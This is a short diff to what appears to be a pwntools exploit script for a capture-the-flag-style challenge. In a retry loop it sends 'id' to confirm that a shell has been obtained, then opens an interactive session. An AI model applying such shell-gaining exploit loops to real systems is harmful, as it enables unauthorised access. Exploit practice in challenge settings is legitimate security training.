@@ -65,9 +65,10 @@ while True:
         io.recvuntil(b"[*] Executing program...\n", timeout=2)
 
         # 测试是否成功获取 shell
-        result = io.recvline(timeout=1)
+        io.sendline(b"id")
+        result = io.recvline(timeout=2)
 
-        if b"[!]" not in result and b"Program finished" not in result:
+        if b"uid=" in result:
             log.success(f"成功！在第 {attempt} 次尝试后获得 shell")
             context(log_level="debug")
             io.interactive()
